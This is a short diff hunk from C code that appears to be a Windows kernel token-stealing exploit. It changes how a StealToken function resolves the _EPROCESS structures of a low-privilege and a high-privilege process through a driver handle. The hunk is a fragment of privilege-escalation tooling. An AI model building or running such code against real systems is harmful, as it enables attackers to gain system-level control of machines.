@@ -91,8 +91,8 @@ DWORD64 ReadToken(HANDLE hdriver, DWORD64 eprocess) {
 
 BOOL StealToken(HANDLE hdriver, DWORD64 k_base, DWORD low_proc_pid, DWORD high_proc_pid) {
 
-    DWORD64 low_proc_eprocess  = Resolve_EPROCESS(hdriver, k_base, low_proc_pid);
-    DWORD64 high_proc_eprocess = Resolve_EPROCESS(hdriver, k_base, high_proc_pid);
+    DWORD64 low_proc_eprocess  = Resolve_EPROCESS(hdriver, low_proc_pid);
+    DWORD64 high_proc_eprocess = Resolve_EPROCESS(hdriver, high_proc_pid);
 
     if (!low_proc_eprocess) {
         printf("[!] _EPROCESS for PID: %lu (Could not be found)\n", low_proc_pid);
